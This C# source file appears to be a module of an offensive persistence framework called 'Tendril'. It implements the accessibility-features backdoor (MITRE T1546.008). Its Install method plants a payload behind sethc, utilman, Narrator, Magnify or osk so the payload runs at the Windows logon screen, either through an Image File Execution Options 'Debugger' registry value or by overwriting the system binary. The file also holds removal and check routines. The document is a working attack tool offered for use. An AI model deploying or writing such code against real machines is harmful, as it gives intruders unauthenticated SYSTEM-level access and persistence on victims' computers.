using System;
using System.Collections.Generic;
using System.IO;
using Tendril.Core;
using Tendril.Utilities;

namespace Tendril.Modules
{
    /// <summary>
    /// Accessibility Features Backdoor (T1546.008)
    ///
    /// Replaces or IFEO-debugger-redirects accessibility executables that can be
    /// triggered from the Windows logon screen (pre-authentication). Classic RDP
    /// backdoor - press Shift 5x for sethc.exe, Win+U for utilman.exe, etc.
    ///
    /// Two modes:
    ///   1. IFEO: sets Debugger value so the accessibility binary launches
    ///      the payload instead. Non-destructive, doesn't modify system files.
    ///   2. Replace: backs up the original binary and copies the payload over it.
    ///      Destructive but survives IFEO cleanup.
    ///
    /// LockBit 3.0 (2024) used sethc.exe replacement for persistent SYSTEM backdoors.
    /// Requires admin.
    /// </summary>
    public class AccessibilityBackdoor : ITendril
    {
        public string Name { get { return "AccessibilityBackdoor"; } }
        public string Description { get { return "Accessibility feature hijack - RDP backdoor via sethc/utilman/narrator"; } }
        public string MitreId { get { return "T1546.008"; } }
        public bool RequiresAdmin { get { return true; } }
        public bool IsReconOnly { get { return false; } }

        // Accessibility binaries triggerable from the logon screen
        private static readonly Dictionary<string, string> Targets = new Dictionary<string, string>
        {
            { "sethc",    @"C:\Windows\System32\sethc.exe" },       // Shift x5
            { "utilman",  @"C:\Windows\System32\utilman.exe" },     // Win+U
            { "narrator", @"C:\Windows\System32\Narrator.exe" },    // Win+U > Narrator
            { "magnify",  @"C:\Windows\System32\Magnify.exe" },     // Win+U > Magnifier
            { "osk",      @"C:\Windows\System32\osk.exe" },         // On-Screen Keyboard
        };

        private const string IFEOPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

        public TendrilResult Install(Dictionary<string, string> options)
        {
            string payload, target, mode;
            if (!options.TryGetValue("payload", out payload))
                return new TendrilResult(ResultStatus.Failed, Name, "Missing required option: /payload:<path>");

            if (!options.TryGetValue("target", out target))
                target = "sethc";

            if (!options.TryGetValue("mode", out mode))
                mode = "ifeo"; // "ifeo" or "replace"

            string targetExe;
            if (!Targets.TryGetValue(target.ToLower(), out targetExe))
                return new TendrilResult(ResultStatus.Failed, Name,
                    "Unknown target. Valid: sethc, utilman, narrator, magnify, osk");

            string targetFileName = Path.GetFileName(targetExe);

            if (mode.ToLower() == "replace")
            {
                try
                {
                    string backup = targetExe + ".bak";
                    if (!File.Exists(backup))
                        File.Copy(targetExe, backup, false);
                    File.Copy(payload, targetExe, true);

                    return new TendrilResult(ResultStatus.Success, Name,
                        string.Format("Replaced {0} with payload", targetFileName))
                        .WithMeta("Target", targetExe)
                        .WithMeta("Backup", backup)
                        .WithMeta("Mode", "Replace");
                }
                catch (Exception ex)
                {
                    return new TendrilResult(ResultStatus.Failed, Name,
                        "Replace failed (TrustedInstaller owns system files): " + ex.Message);
                }
            }
            else // IFEO
            {
                string ifeoKey = IFEOPath + @"\" + targetFileName;
                bool ok = RegistryUtils.SetRegValue("HKLM", ifeoKey, "Debugger", payload);
                if (!ok)
                    return new TendrilResult(ResultStatus.Failed, Name, "Failed to write IFEO Debugger");

                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("IFEO debugger set on {0}", targetFileName))
                    .WithMeta("Target", targetFileName)
                    .WithMeta("Payload", payload)
                    .WithMeta("Trigger", target == "sethc" ? "Shift x5 at logon" :
                              target == "utilman" ? "Win+U at logon" : "Accessibility menu")
                    .WithMeta("Mode", "IFEO");
            }
        }

        public TendrilResult Remove(Dictionary<string, string> options)
        {
            string target, mode;
            if (!options.TryGetValue("target", out target))
                target = "sethc";
            if (!options.TryGetValue("mode", out mode))
                mode = "ifeo";

            string targetExe;
            if (!Targets.TryGetValue(target.ToLower(), out targetExe))
                return new TendrilResult(ResultStatus.Failed, Name, "Unknown target");

            if (mode.ToLower() == "replace")
            {
                string backup = targetExe + ".bak";
                if (File.Exists(backup))
                {
                    try
                    {
                        File.Copy(backup, targetExe, true);
                        File.Delete(backup);
                        return new TendrilResult(ResultStatus.Success, Name, "Original binary restored from backup");
                    }
                    catch (Exception ex)
                    {
                        return new TendrilResult(ResultStatus.Failed, Name, "Restore failed: " + ex.Message);
                    }
                }
                return new TendrilResult(ResultStatus.Warning, Name, "No backup found - manual restore needed");
            }
            else
            {
                string ifeoKey = IFEOPath + @"\" + Path.GetFileName(targetExe);
                RegistryUtils.DeleteRegValue("HKLM", ifeoKey, "Debugger");
                return new TendrilResult(ResultStatus.Success, Name,
                    string.Format("IFEO debugger removed from {0}", Path.GetFileName(targetExe)));
            }
        }

        public List<TendrilResult> Check()
        {
            var results = new List<TendrilResult>();

            foreach (var kv in Targets)
            {
                string fileName = Path.GetFileName(kv.Value);
                string ifeoKey = IFEOPath + @"\" + fileName;
                string debugger = RegistryUtils.GetRegValue("HKLM", ifeoKey, "Debugger");

                if (!string.IsNullOrEmpty(debugger))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("IFEO debugger on {0}: {1}", fileName, debugger))
                        .WithMeta("Target", fileName)
                        .WithMeta("Debugger", debugger)
                        .WithMeta("Trigger", kv.Key));
                }

                // Check if the binary has been replaced (size/hash differs from known good)
                if (File.Exists(kv.Value + ".bak"))
                {
                    results.Add(new TendrilResult(ResultStatus.Warning, Name,
                        string.Format("Backup file exists: {0}.bak - binary may have been replaced", fileName))
                        .WithMeta("Target", kv.Value));
                }
            }

            return results;
        }
    }
}
